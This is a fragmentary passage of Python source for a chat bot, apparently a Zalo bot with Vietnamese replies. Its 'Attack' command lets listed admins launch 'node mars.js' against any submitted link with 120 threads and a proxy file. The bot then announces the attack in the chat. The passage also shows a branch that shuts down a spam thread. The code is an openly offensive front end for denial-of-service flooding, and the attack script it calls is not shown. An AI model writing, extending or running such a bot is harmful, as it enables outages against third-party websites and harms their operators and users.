    ...
    def onMessage(self, mid, author_id, message, message_object, thread_id, thread_type):
        ...
        if message.startswith("Attack"):
            ...
            if author_id not in idadmin:
                ...
                return
            link = message[6:].strip()
            if not link:
                self.replyMessage(Message(text="🚫 Bạn chưa nhập link!"), message_object, thread_id=thread_id, thread_type=thread_type)
                return
            self.replyMessage(Message(text=f"Wait For Attacking On {link}"), message_object, thread_id=thread_id, thread_type=thread_type)
            command = ["node", "mars.js", link, "60", "64", "120", "Vy.txt"]
            try:
                subprocess.Popen(command)
                self.replyMessage(Message(text=f"ATTACKING ON {link} WITH 120 THREADS"), message_object, thread_id=thread_id, thread_type=thread_type)
            except Exception as e:
                self.replyMessage(Message(text=f"🚫 Lỗi khi chạy lệnh: {str(e)}"), message_object, thread_id=thread_id, thread_type=thread_type)
          ...
          if self.reo_spam_thread is not None:
            ...
            if author_id not in idadmin:
                self.replyMessage(Message(text='🚫 Chỉ Fanth Mới Được Sử Dụng.'), message_object, thread_id=thread_id, thread_type=thread_type)
                return
            self.replyMessage(Message(text='Off ! - Success Full'), message_object, thread_id=thread_id, thread_type=thread_type)
            exit()
